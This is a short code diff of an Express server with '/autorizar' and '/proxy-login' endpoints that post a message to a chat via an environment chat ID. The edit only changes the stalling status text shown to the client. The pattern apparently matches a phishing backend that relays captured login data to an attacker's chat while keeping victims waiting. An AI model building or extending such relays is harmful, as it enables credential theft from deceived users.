@@ -54,7 +54,7 @@ app.post("/autorizar", async (req, res) => {
       body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
     });
 
-    res.json({ status: "Estamos actualizando la información", mensaje });
+    res.json({ status: "Epera un momento...", mensaje });
   } catch (err) {
     res.status(500).json({ status: "error", error: err.message });
   }
@@ -78,7 +78,7 @@ app.post("/proxy-login", async (req, res) => {
       body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
     });
 
-    res.json({ status: "Ingresando", mensaje: "Estamos actualizando la información" });
+    res.json({ status: "Ingresando", mensaje: "Epera un momento..." });
   } catch (err) {
     res.status(500).json({ status: "error", error: err.message });
   }
